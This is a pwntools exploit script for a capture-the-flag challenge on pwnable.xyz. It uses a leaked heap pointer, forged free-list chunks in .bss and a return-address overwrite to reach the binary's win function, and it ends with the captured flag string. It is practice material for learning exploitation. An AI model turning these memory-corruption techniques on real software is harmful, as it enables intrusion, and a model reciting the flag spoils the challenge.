from pwn import *
context.log_level = 'error'

def main():

    """ LOCAL = True """
    LOCAL = False
    e = ELF('./challenge')
    win_addr = e.symbols['win']
    print(f"Win addr is: {hex(win_addr)}")
    
    if LOCAL:
        r = process('./challenge')
    else:
        r = remote('svc.pwnable.xyz',30005)

    r.recvuntil(">")
    r.sendline("2")
    malloc_pointer = int(r.recvline().strip(), 16)
    print(f"Malloc pointer addr is: {hex(malloc_pointer)}")

    # This is to populate the malloc pointer with some data
    # The format is <8 bytes> with is some padding / header information? 
    # <8 bytes> <-- the "3" function will assign this as the new pointer 
    # 0x601000 is the start of the bss section, but need to make it this because there is some stdlibc data in that memory region that we should not overwrite
    bss = 0x601038
    offset = 0x58 # Found using gdb by breaking at the ret address 

    # Need to grab the return address
    r.recvuntil(">")
    r.sendline("1")
    r.send(b'A' * 8 + p64(malloc_pointer + offset)) # some padding since the malloc assignment happens 8 bytes after
    r.recvuntil(">")
    r.sendline("3")
    """ print("Finished making malloc pointer the return address") """


    r.recvuntil(">")
    r.sendline("1") # put in some data
    r.send(p64(win_addr) + p64(bss))
    r.recvuntil(">")
    r.sendline("3")
    """ print("Finished making malloc the win address") """

    # overwrite this data 
    r.recvuntil(">")
    r.sendline("1")
    # 1) Question / to test:
    #   Does the size of the payload actually matter?
    # 2)
    # the order is chunk size followed by the forward malloc_pointer
    # when this object is freed, there needs to be valid memory that the free list header needs to point to
    # it should point to this
    # As long as the offset is ok, this sequence of sending also works
    # The alignment MUST be correct though
    #s(p64(win)+p64(bss + 96)) # ret -> win
    #s(p64(0x51) + p64(bss + 16))
    #s(p64(0x51)+p64(bss+96+8)) # fake chunk2

    # Changing the bss start location is also ok

    #Changing the size of the malloc is also ok 0x51 worked, 0x41 worked

    r.send(p64(0x31) + p64(bss + 0x50)) 
    time.sleep(0.5)
    r.recvuntil(">")
    r.sendline("3")
    """ gdb.attach(r) """
    """ print("Finished creating first free list chunk") """

    r.recvuntil(">")
    r.sendline("1")
    r.send(p64(0x31) + p64(bss + 0x8))
    time.sleep(0.5)
    r.recvuntil(">")
    r.sendline("3")
    print("Finished creating second free list chunk")

    r.recvuntil(">")
    r.sendline("0")
    r.interactive()


if __name__ == '__main__':
    main()
    # flag: FLAG{I_promise_it_gets_better}
